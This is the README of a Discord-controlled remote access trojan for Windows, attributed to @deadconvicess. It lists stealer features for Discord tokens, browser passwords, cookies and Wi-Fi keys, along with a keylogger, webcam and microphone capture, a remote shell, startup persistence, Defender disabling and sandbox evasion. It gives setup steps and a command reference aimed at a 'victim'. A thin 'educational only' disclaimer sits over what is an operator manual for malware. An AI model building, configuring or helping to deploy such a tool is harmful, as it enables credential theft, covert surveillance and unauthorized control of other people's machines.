=======================================================================
🐀 DISCORD RAT — REMOTE ADMINISTRATION TOOLKIT
=======================================================================

Created by: @deadconvicess
Status    : Development / Educational Only
Language  : Python 3.10+
Platform  : Windows Only
=======================================================================

⚠️ DISCLAIMER
=======================================================================
This software is for EDUCATIONAL and RESEARCH purposes only.
You are solely responsible for any misuse of this tool. The developer 
does NOT condone malicious activity or unauthorized access.

=======================================================================
🔥 FEATURES
=======================================================================
[+] Discord Token Grabber
[+] Spotify Access Token Stealer
[+] Webcam Snap + Microphone Recorder
[+] Screen Capture & Full Screen Recorder
[+] Keylogger with Live Discord Logging
[+] VM & Sandbox Detection
[+] File Upload & Remote Command Execution
[+] Chrome/Edge/Brave Password Stealer
[+] Browser Cookie & History Grabber
[+] Wi-Fi Credentials Extractor
[+] Registry & Schtasks Startup Persistence
[+] Task Manager Blocker / Unlocker
[+] Discord-Controlled Command Interface
[+] System Info & Geolocation
[+] Shutdown, Restart, Monitor Power Control
[+] Fake Error Message / TTS Speech
[+] Defender Disabler (Basic PowerShell)
[+] Self Delete, Memory Wipe, Crash PC

=======================================================================
📦 SETUP INSTRUCTIONS
=======================================================================

1. Create a private Pastebin with 2 lines:
   ----------------------------------------
   LINE 1: Your Discord Bot Token
   LINE 2: Your Webhook URL
   ----------------------------------------

2. Replace the config_url value:
   config_url = "https://pastebin.com/raw/your_id_here"

3. Run:
   > python Rat.py

   (Auto-installs dependencies. Requires Python 3.10+)

=======================================================================
💻 COMMAND REFERENCE
=======================================================================

[ SYSTEM ]
.help               - Show help menu
.info               - Get PC name, user, OS, IP
.geo                - Victim’s IP + Country + ISP
.ss                 - Take screenshot
.record             - Record screen (10s, 60fps)
.webcam             - Take webcam photo
.restart            - Restart PC
.shutdown           - Shutdown PC
.crash              - Kill svchost (may BSOD)

[ CONTROL ]
.key start/stop     - Start/Stop keylogger (saves to Discord)
.shell <cmd>        - Run PowerShell or CMD commands
.moff / .mon        - Turn off/on monitor
.msg <text>         - Show fake error popup
.speak <txt|rate|vol> - TTS Speech via victim speakers

[ FILE SYSTEM ]
.up                 - Upload & auto-execute file
.Df                 - Delete memory-stored payloads
.stup / .clearstup  - Add/remove from Task Scheduler startup
.reg / .rmreg       - Add/remove from registry startup

[ Stealers ]
.token              - Grab all Discord tokens
.sp                 - Grab Spotify OAuths + passwords
.gc                 - Grab browser cookies
.pw                 - Grab browser passwords
.af                 - Grab browser autofill
.dl                 - Show download history
.history            - Dump Chrome/Brave/Edge history

[ FUN/MEME ]
.rr                 - Rickroll
.web                - Spam useless/funny websites
.cap                - CapsLock spam
.open <url>         - Open link on victim PC

[ OS SETTINGS ]
.v <0-100>          - Set system volume %
.wifi               - Grab Wi-Fi SSIDs & passwords
.wp <img or url>    - Change wallpaper
.gwp                - Steal current wallpaper

[ PROTECTION BYPASS ]
.dwd                - Disable basic Defender settings
.rtp                - Disable Real-Time Protection
.disable_mgr        - Disable Task Manager
.enable_mgr         - Re-enable Task Manager

=======================================================================
📁 FILE STRUCTURE
=======================================================================
Rat.py              - Main bot script
README.txt          - You are here
requirements.txt    - Optional: list of dependencies

=======================================================================
🛠 DEPENDENCIES (Auto-installed)
=======================================================================
discord
requests
pypiwin32
pycaw
comtypes
opencv-python
numpy
sounddevice
scipy
pyautogui
pynput
cryptography
pycryptodome
pillow
aiofiles
pyttsx3

=======================================================================
✅ TESTED ON
=======================================================================
- Windows 10 / 11
- Python 3.10 and 3.11
- Discord.py 2.x

=======================================================================
🧠 NOTE
=======================================================================
This project does not use Discord Webhooks to control—only to log.
Command & control is fully via a custom Discord Bot.

DO NOT run on your own system unless you know what you're doing.
Use inside VMs or sandboxes.

=======================================================================
👤 AUTHOR
=======================================================================
GitHub: https://github.com/deadconvicess
Project: Discord RAT by @deadconvicess

=======================================================================
